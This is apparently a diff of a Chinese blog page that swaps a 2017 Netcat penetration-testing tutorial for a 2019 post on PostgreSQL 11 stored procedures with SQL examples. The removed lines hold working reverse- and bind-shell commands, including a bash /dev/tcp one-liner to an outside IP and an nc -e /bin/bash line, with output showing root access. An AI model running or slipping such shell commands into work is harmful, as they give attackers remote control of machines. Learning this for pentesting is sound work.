@@ -79,7 +79,7 @@
 
 
 
-  <meta name="keywords" content="Linux,渗透,Kali," />
+  <meta name="keywords" content="Database,Postgresql," />
 
 
 
@@ -90,21 +90,18 @@
 
 
 
-<meta name="description" content="1.用Netcat进行黑客攻击第1部分：基础知识Netcat是一个很好的网络实用程序，用于使用TCP和UPD协议读取和写入网络连接。Netcat通常被称为网络工具中的瑞士军刀，我们将在使用黑客教程的不同教程中大量使用它。Netcat最常见的用途是设置反向和绑定shell，管道和重定向网络流量，端口侦听，调试程序和脚本以及Banner抓取。在本教程中，我们将学习如何使用Netcat的基本功能，如：">
-<meta name="keywords" content="Linux,渗透,Kali">
+<meta name="description" content="PG11之前采用Function.   PG10-存储过程) PG11新增PROCEDURE[存储过程]模式对象 ​    存储过程与函数类似, 但存储过程并没有返回值.">
+<meta name="keywords" content="Database,Postgresql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Netcat 网络攻击 以及 应用">
-<meta property="og:url" content="http://www.gangzai.online/2017/07/09/kali/NetCat学习介绍/index.html">
+<meta property="og:title" content="Postgresql11 存储过程">
+<meta property="og:url" content="http://www.gangzai.online/2019/09/27/PostgreSQL/2019-09-27-Postgresql-存储过程比较-PG10&11/index.html">
 <meta property="og:site_name" content="Rocky_Ansi Blog">
-<meta property="og:description" content="1.用Netcat进行黑客攻击第1部分：基础知识Netcat是一个很好的网络实用程序，用于使用TCP和UPD协议读取和写入网络连接。Netcat通常被称为网络工具中的瑞士军刀，我们将在使用黑客教程的不同教程中大量使用它。Netcat最常见的用途是设置反向和绑定shell，管道和重定向网络流量，端口侦听，调试程序和脚本以及Banner抓取。在本教程中，我们将学习如何使用Netcat的基本功能，如：">
+<meta property="og:description" content="PG11之前采用Function.   PG10-存储过程) PG11新增PROCEDURE[存储过程]模式对象 ​    存储过程与函数类似, 但存储过程并没有返回值.">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://www.gangzai.online/img/kali/nc反向攻击.png">
-<meta property="og:image" content="http://www.gangzai.online/img/kali/nc正向绑定.jpg">
-<meta property="og:updated_time" content="2018-11-19T16:06:11.571Z">
+<meta property="og:updated_time" content="2019-09-28T08:15:10.889Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Netcat 网络攻击 以及 应用">
-<meta name="twitter:description" content="1.用Netcat进行黑客攻击第1部分：基础知识Netcat是一个很好的网络实用程序，用于使用TCP和UPD协议读取和写入网络连接。Netcat通常被称为网络工具中的瑞士军刀，我们将在使用黑客教程的不同教程中大量使用它。Netcat最常见的用途是设置反向和绑定shell，管道和重定向网络流量，端口侦听，调试程序和脚本以及Banner抓取。在本教程中，我们将学习如何使用Netcat的基本功能，如：">
-<meta name="twitter:image" content="http://www.gangzai.online/img/kali/nc反向攻击.png">
+<meta name="twitter:title" content="Postgresql11 存储过程">
+<meta name="twitter:description" content="PG11之前采用Function.   PG10-存储过程) PG11新增PROCEDURE[存储过程]模式对象 ​    存储过程与函数类似, 但存储过程并没有返回值.">
 
 
 
@@ -138,7 +135,7 @@
 
 
 
-  <title>Netcat 网络攻击 以及 应用 | Rocky_Ansi Blog</title>
+  <title>Postgresql11 存储过程 | Rocky_Ansi Blog</title>
   
 
 
@@ -311,7 +308,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.gangzai.online/2017/07/09/kali/NetCat学习介绍/">
+    <link itemprop="mainEntityOfPage" href="http://www.gangzai.online/2019/09/27/PostgreSQL/2019-09-27-Postgresql-存储过程比较-PG10&11/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Rocky_Ansi">
@@ -328,7 +325,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Netcat 网络攻击 以及 应用</h1>
+          <h1 class="post-title" itemprop="name headline">Postgresql11 存储过程</h1>
         
 
         <div class="post-meta">
@@ -340,8 +337,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-09T19:34:12+08:00">
-                2017-07-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-27T20:27:32+08:00">
+                2019-09-27
               </time>
             
 
@@ -350,6 +347,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Database/" itemprop="url" rel="index">
+                    <span itemprop="name">Database</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -378,71 +397,40 @@
       
 
       
-        <h4 id="1-用Netcat进行黑客攻击第1部分：基础知识"><a href="#1-用Netcat进行黑客攻击第1部分：基础知识" class="headerlink" title="1.用Netcat进行黑客攻击第1部分：基础知识"></a>1.用Netcat进行黑客攻击第1部分：基础知识</h4><p>Netcat是一个很好的网络实用程序，用于使用TCP和UPD协议读取和写入网络连接。Netcat通常被称为网络工具中的瑞士军刀，我们将在使用黑客教程的不同教程中大量使用它。Netcat最常见的用途是设置反向和绑定shell，管道和重定向网络流量，端口侦听，调试程序和脚本以及Banner抓取。在本教程中，我们将学习如何使用Netcat的基本功能，如： </p>
-<blockquote>
-<p>   Banner抓取  原始连接  Web服务器交互 </p>
-</blockquote>
+        <p>PG11之前采用Function.   <a href="[https://gangzai.online/2018/09/18/database/Postgresql%E6%89%A9%E5%B1%95SQL%E4%B8%8E%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/](https://gangzai.online/2018/09/18/database/Postgresql扩展SQL与存储过程/">PG10-存储过程</a>)</p>
+<p>PG11新增PROCEDURE[存储过程]模式对象</p>
+<p>​    存储过程与函数类似, 但存储过程并没有返回值.</p>
 <a id="more"></a>
-<p><br></p>
-<h6 id="1-1-Netcat-Banner获取"><a href="#1-1-Netcat-Banner获取" class="headerlink" title="1.1        Netcat Banner获取"></a>1.1        Netcat Banner获取</h6><p>使用以下命令来获取服务器Banner（与服务建立原始连接）：</p>
-<pre><code>nc [ip address] [port]
-我们来试试这个在21端口运行的Metasploitable 2上的FTP服务：
-
-nc 192.168.1.100 21
-nc [ip] [port]用于与端口进行原始连接，当可用时将返回服务器Banner。
-
-    code:
-     rocky@kail: nc 23.105.202.xx 21   # 21 ftp 控制链接
-     220 (vsFTPd 2.2.2)       # 系统服务 banner
-</code></pre><h6 id="1-2-Netcat原连接"><a href="#1-2-Netcat原连接" class="headerlink" title="1.2        Netcat原连接"></a>1.2        Netcat原连接</h6><pre><code>为了演示原始连接的工作原理，我们将在FTP服务连接到目标主机后发出一些FTP命令。
-在匿名的情况下，我们来看看这个FTP服务器是否允许匿名访问，通过USER和PASS命令。
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">code:</span><br><span class="line">	rocky@kail: nc 23.105.202.xx 21</span><br><span class="line">	220 (vsFTPd 2.2.2)</span><br><span class="line">	user Postgres</span><br><span class="line">	331 Please specify the password.</span><br></pre></td></tr></table></figure>
-<h6 id="1-3-Web服务器交互"><a href="#1-3-Web服务器交互" class="headerlink" title="1.3        Web服务器交互"></a>1.3        Web服务器交互</h6><pre><code>Netcat还可以通过发出HTTP请求与Web服务器进行交互。
-通过以下命令，我们可以抓住在Metasploitable 2上运行的Web服务的Banner：
-
-nc 23.105.202.xx 80
-</code></pre><p>然后运行此HTTP请求：</p>
-<pre><code>HEAD / HTTP / 1.0
-
-rocky@kail: nc 23.105.202.xx 80
-HEAD / HTTP / 1.0          &lt;&lt; 输入
-HTTP/1.1 400 Bad Request
-Server: nginx/1.12.0
-Date: Sun, 28 May 2017 08:06:19 GMT
-Content-Type: text/html
-Content-Length: 173
-Connection: close
-</code></pre><h6 id="1-4-使用Netcat进行文件传输"><a href="#1-4-使用Netcat进行文件传输" class="headerlink" title="1.4     使用Netcat进行文件传输"></a>1.4     使用Netcat进行文件传输</h6><blockquote>
-<p>  在这个例子中，我们将使用Netcat连接传输一个文本文件。假设我们在目标主机上执行远程命令，我们希望将文件从攻击主机传输到目标主机。首先，我们需要在目标主机上设置一个侦听器，并从攻击主机连接到它。我们将使用端口8080用于此目的，我们将该文件安全保存到桌面:  </p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080&gt; 1.txt</span><br></pre></td></tr></table></figure>
-<pre><code>在攻击主机上，我们连接到8080端口并发送文件名称transfer.txt：
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.100.107 8080 &lt; 1.txt</span><br></pre></td></tr></table></figure>
-<h4 id="2-用Netcat进行黑客攻击第2部分：绑定和反向shell"><a href="#2-用Netcat进行黑客攻击第2部分：绑定和反向shell" class="headerlink" title="2        用Netcat进行黑客攻击第2部分：绑定和反向shell"></a>2        用Netcat进行黑客攻击第2部分：绑定和反向shell</h4><p>Netcat反向reverse shell</p>
-<blockquote>
-<p>  在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。</p>
-</blockquote>
-<p>在下面的内容中我们将展示使用bind shell和reverse shell。下面将使用4444端口，但请注意，这可以是任何开放端口。实际上，通常您需要使用更常见的端口，如80和443来设置反向shell，因为这些端口是更常见的打开。</p>
-<p>NC reverse shell 工作原理:<br><img src="/img/kali/nc反向攻击.png" alt="NC reverse shell"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击主机A执行:</span><br><span class="line"> 	nc -lvp 4444        ; 监听被攻击者链接</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">被攻击主机B执行:</span><br><span class="line">	nc  xxx.xxx.xxx.xxx  4444 -e /bin/bash ; 将bash shell 权限提供给攻击者 实现控制权限的转移;</span><br></pre></td></tr></table></figure>
-<p>实现通信后: </p>
-<blockquote>
-<p> 在攻击主机A上执行命令，即可操作被攻击者B</p>
-</blockquote>
-<p>缺点:</p>
-<blockquote>
-<p>  此时被攻击者B 需要使用Netcat命令， 而且普通 GNU Linux nc 并没有 -e { -e filename   program to exec after connect [dangerous]} 参数; 顾此种反向链接并不适用;</p>
-</blockquote>
-<h6 id="2-1-使用Bash-来代替Nc实现反向链接"><a href="#2-1-使用Bash-来代替Nc实现反向链接" class="headerlink" title="2.1  使用Bash 来代替Nc实现反向链接;"></a>2.1  使用Bash 来代替Nc实现反向链接;</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">被攻击主机B:</span><br><span class="line">	bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者A:</span><br><span class="line">	nc -lvp 4444</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A机代码:</span><br><span class="line">[root@virtualS ~]# nc -lvp 4444</span><br><span class="line">Connection from 111.15.33.114:17835      ## 此时B机执行转移指令 bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1</span><br><span class="line">root@kailvirtual:~#</span><br><span class="line">root@kailvirtual:~#</span><br><span class="line">root@kailvirtual:~#</span><br><span class="line">root@kailvirtual:~#</span><br><span class="line">root@kailvirtual:~# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kailvirtual:~#</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">	bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1 </span><br><span class="line"></span><br><span class="line">命令解释:</span><br><span class="line">	bash:</span><br><span class="line">		-i  if the -i option is present, the shell is interactive</span><br><span class="line">	</span><br><span class="line">	shell:</span><br><span class="line">		0/1/2 分别代表Linux标准输入，输出，异常 即 C编程中的 stdin, stdout, stderr</span><br><span class="line">	</span><br><span class="line">	0&gt;&amp;1   指 将标准输入完全输出到标准输出中; </span><br><span class="line">		采用&amp;可以将 0/1 绑定在一起。这条命令的作用标准输入将和标准输出同用一个文件描述符，说人话就是错误输入将会和标准输出输出到同一个地方。</span><br></pre></td></tr></table></figure>
-<h6 id="2-2-Netcat正向bind-Shell"><a href="#2-2-Netcat正向bind-Shell" class="headerlink" title="2.2 Netcat正向bind Shell"></a>2.2 Netcat正向bind Shell</h6><pre><code>bind shell是一个绑定到目标主机上的特定端口以监听即将到来的连接的shell。我们来看看一个Netcat正向bind shell的原理:
-</code></pre><p><img src="/img/kali/nc正向绑定.jpg" alt="Nc Bind Shell"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">攻击主机A:</span><br><span class="line">	rocky@mac: nc 192.168.1.9 4444</span><br><span class="line">	</span><br><span class="line">	id</span><br><span class="line">	uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	echo $HOSTNAME</span><br><span class="line">	kailvirtual</span><br></pre></td></tr></table></figure>
-<p>相同点:<br>        我们都需要被攻击者将其shell控制权限交给我们<br>    将shell command 以数据流的形式重定向到被攻击主机的Bash shell中;</p>
-<p><a href="http://www.freebuf.com/column/135007.html" target="_blank" rel="noopener">更多Nc 学习参照链接</a></p>
+<h4 id="Postgresql-org-官网主要介绍"><a href="#Postgresql-org-官网主要介绍" class="headerlink" title="Postgresql.org 官网主要介绍"></a>Postgresql.org 官网主要介绍</h4><ul>
+<li><p>SQL stored procedures that support embedded transactions</p>
+<ul>
+<li>在定义中允许使用commit &amp; rollback语句.</li>
+</ul>
+</li>
+<li><p>Add SQL-level procedures, which can start and commit their own transactions (Peter Eisentraut)</p>
+<p>They are created with the new <a href="https://www.postgresql.org/docs/11/sql-createprocedure.html" target="_blank" rel="noopener"><code>CREATE PROCEDURE</code></a> command and invoked via <a href="https://www.postgresql.org/docs/11/sql-call.html" target="_blank" rel="noopener"><code>CALL</code></a>.</p>
+<p>使用call调用存储过程.</p>
+<p>The new <code>ALTER</code>/<code>DROP ROUTINE</code> commands allow altering/dropping of all routine-like objects, including procedures, functions, and aggregates.</p>
+<p>Also, writing <code>FUNCTION</code> is now preferred over writing <code>PROCEDURE</code> in <code>CREATE OPERATOR</code> and <code>CREATE TRIGGER</code>, because the referenced object must be a function not a procedure. However, the old syntax is still accepted for compatibility.</p>
+</li>
+</ul>
+<h5 id="简单示例-procedure创建"><a href="#简单示例-procedure创建" class="headerlink" title="简单示例: - procedure创建;"></a>简单示例: - procedure创建;</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb1(<span class="keyword">id</span> <span class="built_in">int</span>, <span class="keyword">name</span> <span class="built_in">text</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> proc1(<span class="keyword">id</span> <span class="built_in">integer</span>, <span class="keyword">name</span> <span class="built_in">text</span>) <span class="keyword">returns</span> <span class="built_in">void</span></span><br><span class="line"><span class="keyword">LANGUAGE</span> <span class="keyword">sql</span>  <span class="keyword">as</span>  $$</span><br><span class="line">	<span class="keyword">insert</span> <span class="keyword">into</span> tb1(<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">values</span> (<span class="keyword">id</span>, <span class="keyword">name</span>); //真正操作的sql语句;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
+<p>存储过程调用:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">call</span> proc1(<span class="number">1</span>, <span class="string">'the first value'</span>);</span><br><span class="line"><span class="keyword">call</span> proc1(<span class="number">1</span>, <span class="string">'the second value'</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="函数-Function-常见两种写法"><a href="#函数-Function-常见两种写法" class="headerlink" title="函数[Function]常见两种写法:"></a>函数[Function]常见两种写法:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> <span class="keyword">add</span>(a <span class="built_in">INTEGER</span>, b <span class="built_in">NUMERIC</span>)</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="built_in">NUMERIC</span></span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line">	<span class="keyword">SELECT</span> a+b;</span><br><span class="line">$$ LANGUAGE SQL;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> plus_and_minus</span><br><span class="line">(<span class="keyword">IN</span> a <span class="built_in">INTEGER</span>, <span class="keyword">IN</span> b <span class="built_in">NUMERIC</span>, <span class="keyword">OUT</span> c <span class="built_in">NUMERIC</span>, <span class="keyword">OUT</span> d <span class="built_in">NUMERIC</span>)</span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line">	<span class="keyword">SELECT</span> a+b, a-b;</span><br><span class="line">$$ LANGUAGE SQL;</span><br></pre></td></tr></table></figure>
+<p>主要带有返回值. 并表明返回值的行列个数, 类型</p>
+<h5 id="存储过程-procedure-写法"><a href="#存储过程-procedure-写法" class="headerlink" title="存储过程[procedure]写法"></a>存储过程[procedure]写法</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> [ <span class="keyword">OR</span> <span class="keyword">REPLACE</span> ] <span class="keyword">PROCEDURE</span></span><br><span class="line">    <span class="keyword">name</span> ( [ [ argmode ] [ argname ] argtype [ &#123; <span class="keyword">DEFAULT</span> | = &#125; default_expr ] [, ...] ] )</span><br><span class="line">  &#123; <span class="keyword">LANGUAGE</span> lang_name</span><br><span class="line">    | TRANSFORM &#123; <span class="keyword">FOR</span> <span class="keyword">TYPE</span> type_name &#125; [, ... ]</span><br><span class="line">    | [ <span class="keyword">EXTERNAL</span> ] <span class="keyword">SECURITY</span> INVOKER | [ <span class="keyword">EXTERNAL</span> ] <span class="keyword">SECURITY</span> DEFINER</span><br><span class="line">    | <span class="keyword">SET</span> configuration_parameter &#123; <span class="keyword">TO</span> <span class="keyword">value</span> | = <span class="keyword">value</span> | <span class="keyword">FROM</span> <span class="keyword">CURRENT</span> &#125;</span><br><span class="line">    | <span class="keyword">AS</span> <span class="string">'definition'</span></span><br><span class="line">    | <span class="keyword">AS</span> <span class="string">'obj_file'</span>, <span class="string">'link_symbol'</span></span><br><span class="line">  &#125; ...</span><br></pre></td></tr></table></figure>
+<p>其余与function相同;</p>
+<h5 id="关于Postgresql官网所说对于事务支持"><a href="#关于Postgresql官网所说对于事务支持" class="headerlink" title="关于Postgresql官网所说对于事务支持:"></a>关于Postgresql官网所说对于事务支持:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">PROCEDURE</span> proc2()</span><br><span class="line"> <span class="keyword">LANGUAGE</span> plpgsql</span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"> <span class="keyword">FOR</span> i <span class="keyword">IN</span> <span class="number">0.</span><span class="number">.9</span> <span class="keyword">LOOP</span></span><br><span class="line">  <span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl(<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">VALUES</span> (i, <span class="string">'value: '</span>|| i);</span><br><span class="line">  IF i % 2 = 0 THEN</span><br><span class="line">   <span class="keyword">COMMIT</span>;</span><br><span class="line">  ELSE</span><br><span class="line">   <span class="keyword">ROLLBACK</span>; </span><br><span class="line">  <span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line"> <span class="keyword">END</span> <span class="keyword">LOOP</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ ;</span><br></pre></td></tr></table></figure>
+<p>结果展示:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ligang=# call proc2 ();</span><br><span class="line"><span class="keyword">CALL</span></span><br><span class="line">ligang=# </span><br><span class="line">ligang=# </span><br><span class="line">ligang=# <span class="keyword">select</span> * <span class="keyword">from</span> tbl ;</span><br><span class="line"> id |   name   </span><br><span class="line"><span class="comment">----+----------</span></span><br><span class="line">  0 | value: 0</span><br><span class="line">  2 | value: 2</span><br><span class="line">  4 | value: 4</span><br><span class="line">  6 | value: 6</span><br><span class="line">  8 | value: 8</span><br><span class="line">(5 rows)</span><br></pre></td></tr></table></figure>
+<h5 id="psql中"><a href="#psql中" class="headerlink" title="psql中:"></a>psql中:</h5><p>\df 查看存储过程;</p>
+<p>\sf 查看存储过程定义;</p>
+<h4 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h4><p><a href="https://www.postgresql.org/docs/11/sql-createprocedure.html" target="_blank" rel="noopener">sql create procedure</a></p>
+<p><a href="https://www.postgresql.org/docs/11/sql-alterprocedure.html" target="_blank" rel="noopener">sql alter procedure</a></p>
+<p><a href="https://www.postgresql.org/docs/11/sql-dropprocedure.html" target="_blank" rel="noopener">sql drop procedure</a></p>
+<p><a href="https://www.postgresql.org/docs/11/sql-call.html" target="_blank" rel="noopener">sql call</a></p>
 
       
     </div>
@@ -489,11 +477,9 @@ Connection: close
       
         <div class="post-tags">
           
-            <a href="/tags/Linux/" rel="tag"># Linux</a>
+            <a href="/tags/Database/" rel="tag"># Database</a>
           
-            <a href="/tags/渗透/" rel="tag"># 渗透</a>
-          
-            <a href="/tags/Kali/" rel="tag"># Kali</a>
+            <a href="/tags/Postgresql/" rel="tag"># Postgresql</a>
           
         </div>
       
@@ -506,8 +492,8 @@ Connection: close
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/07/09/commands/Linux_encoding/" rel="next" title="Linux 字符编码 查看与转换">
-                <i class="fa fa-chevron-left"></i> Linux 字符编码 查看与转换
+              <a href="/2019/09/18/PostgreSQL/2019-09-18-Postgresql-CheckPoint/" rel="next" title="Postgresql max_wal_size与Xlog file">
+                <i class="fa fa-chevron-left"></i> Postgresql max_wal_size与Xlog file
               </a>
             
           </div>
@@ -515,10 +501,6 @@ Connection: close
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/07/10/gram/python_tornado_微信公众号/" rel="prev" title="Python + Tornado 搭建自动回复微信公众号">
-                Python + Tornado 搭建自动回复微信公众号 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -697,7 +679,7 @@ Connection: close
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-用Netcat进行黑客攻击第1部分：基础知识"><span class="nav-number">1.</span> <span class="nav-text">1.用Netcat进行黑客攻击第1部分：基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-1-Netcat-Banner获取"><span class="nav-number">1.0.1.</span> <span class="nav-text">1.1        Netcat Banner获取</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-2-Netcat原连接"><span class="nav-number">1.0.2.</span> <span class="nav-text">1.2        Netcat原连接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-3-Web服务器交互"><span class="nav-number">1.0.3.</span> <span class="nav-text">1.3        Web服务器交互</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-4-使用Netcat进行文件传输"><span class="nav-number">1.0.4.</span> <span class="nav-text">1.4     使用Netcat进行文件传输</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-用Netcat进行黑客攻击第2部分：绑定和反向shell"><span class="nav-number">2.</span> <span class="nav-text">2        用Netcat进行黑客攻击第2部分：绑定和反向shell</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#2-1-使用Bash-来代替Nc实现反向链接"><span class="nav-number">2.0.1.</span> <span class="nav-text">2.1  使用Bash 来代替Nc实现反向链接;</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-2-Netcat正向bind-Shell"><span class="nav-number">2.0.2.</span> <span class="nav-text">2.2 Netcat正向bind Shell</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Postgresql-org-官网主要介绍"><span class="nav-number">1.</span> <span class="nav-text">Postgresql.org 官网主要介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#简单示例-procedure创建"><span class="nav-number">1.1.</span> <span class="nav-text">简单示例: - procedure创建;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#函数-Function-常见两种写法"><span class="nav-number">1.2.</span> <span class="nav-text">函数[Function]常见两种写法:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#存储过程-procedure-写法"><span class="nav-number">1.3.</span> <span class="nav-text">存储过程[procedure]写法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关于Postgresql官网所说对于事务支持"><span class="nav-number">1.4.</span> <span class="nav-text">关于Postgresql官网所说对于事务支持:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#psql中"><span class="nav-number">1.5.</span> <span class="nav-text">psql中:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#资料"><span class="nav-number">2.</span> <span class="nav-text">资料</span></a></li></ol></div>
             
 
           </div>
